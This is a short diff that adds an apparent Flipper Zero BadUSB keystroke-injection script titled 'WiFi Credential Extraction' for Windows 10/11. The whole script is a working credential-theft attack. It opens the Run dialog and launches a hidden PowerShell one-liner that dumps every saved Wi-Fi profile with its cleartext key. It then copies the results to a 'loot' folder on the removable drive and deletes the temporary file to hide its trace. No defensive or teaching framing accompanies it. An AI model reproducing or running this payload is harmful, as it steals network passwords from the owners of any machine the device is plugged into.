@@ -1,0 +1,10 @@
+REM FLLC - WiFi Credential Extraction
+REM Extracts all saved WiFi profiles and passwords to a text file on the Flipper SD card.
+REM Target: Windows 10/11
+REM Execution Time: ~8 seconds
+
+DELAY 800
+GUI r
+DELAY 500
+STRING powershell -w hidden -nop -c "$o='';netsh wlan show profiles|Select-String ':(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$p=(netsh wlan show profile name=$n key=clear|Select-String 'Key Content\s+:\s+(.+)$');$k=if($p){$p.Matches.Groups[1].Value.Trim()}else{'(none)'};$o+=\"$n : $k`n\"};$o|Out-File $env:TEMP\w.txt;$d=(Get-WmiObject Win32_LogicalDisk|?{$_.DriveType -eq 2}|Select -First 1).DeviceID;if($d){Copy-Item $env:TEMP\w.txt \"$d\loot\wifi_$(hostname).txt\" -Force};Remove-Item $env:TEMP\w.txt -Force"
+ENTER
